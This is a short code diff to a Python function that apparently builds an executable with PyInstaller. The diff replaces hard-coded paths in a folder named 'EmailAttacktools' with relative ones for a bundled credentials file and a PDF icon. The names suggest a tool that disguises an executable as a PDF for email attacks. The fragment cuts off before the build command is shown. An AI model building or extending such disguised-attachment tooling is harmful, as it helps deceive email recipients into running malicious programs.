@@ -1,4 +1,5 @@
 import subprocess
+import os
 
 def convert_exe_to_format(exe_file, output_format, data_file, target_dir='.'):
     # if output_format not in ['pdf', 'img']:
@@ -13,11 +14,12 @@ def convert_exe_to_format(exe_file, output_format, data_file, target_dir='.'):
     # Specify the file to add and the target directory
     target_dir = '.'
 
-    # Specify the credentials file to add
-    credentials_file = 'd:\\EmailAttacktools\\credentials.txt'
+    # Get the current directory
+    current_dir = os.path.dirname(os.path.abspath(__file__))
 
-    # Specify the icon file
-    icon_file = 'd:\\EmailAttacktools\\pdf.ico'
+    # Specify the credentials file and icon file dynamically
+    credentials_file = os.path.join(current_dir, 'credentials.txt')
+    icon_file = os.path.join(current_dir, 'pdf.ico')
 
     # Construct the pyinstaller command with --add-data for both data_file and credentials_file, and --icon
     command = [
